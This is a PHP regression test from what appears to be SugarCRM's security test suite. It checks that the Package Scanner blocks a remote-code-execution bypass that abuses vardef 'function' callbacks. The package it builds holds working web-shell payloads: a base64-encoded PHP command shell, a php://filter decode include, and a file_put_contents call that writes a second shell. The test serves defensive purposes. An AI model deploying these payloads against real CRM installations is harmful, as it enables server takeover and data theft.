<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\SugarCRMScenario;
use Regression\Helpers\MLPBuilder;

class MetadataRegression extends SugarCRMScenario
{
    /**
     * @return string
     */
    public function getRegressionDescription(): string
    {
        return <<<'TEXT'
[BR-10135] RCE. Metadata driven bypass of Package Scanner. 
Vardefs have a special key = 'function' where we can specify a callback that should be called to get the value of the field
TEXT;
    }

    /**
     * @throws \GuzzleHttp\Exception\GuzzleException
     * @throws \Regression\RegressionException
     */
    public function run(): void
    {
        $this->login('admin', 'asdf')
            ->bwcLogin();

        $mlpBuilder = (new MLPBuilder(static::$sugarVersion['sugar_version'], 'metadata_exploit'))
            ->addFile(
                'inc.php',
                'PD9waHAgaWYoIWVtcHR5KCRfR0VUWyJjbWQiXSkpIHsgc3lzdGVtKCRfR0VUWyJjbWQiXSk7IGRpZSgpO30=',
                'custom/inc.php'
            )
            ->addFile(
                'exploit_fields.php',
                <<<'VARDEFS'
<?php

$dictionary['Contact']['fields']['name']['function']['name']='strlen';
$dictionary['Contact']['fields']['name']['function']['params']=['foo'];
$dictionary['Contact']['fields']['name']['function']['include']= 'php://filter/convert.base64-decode/resource=custom/inc.php';

$dictionary['Contact']['fields']['description']['function']['name']='\\file_put_contents';
$dictionary['Contact']['fields']['description']['function']['params']= ['metadata_exploit.php', '<?php system($_GET["cmd"]);?>'];

VARDEFS,
                'custom/Extension/modules/Contacts/Ext/Vardefs/exploit_fields.php'
            )
            ->build();

        $this
            ->uploadMLP($mlpBuilder->getPath())
            ->expectSubstring('\\file_put_contents()')
            ->expectSubstring('php://filter/convert.base64-decode/resource=custom/inc.php');
    }
}
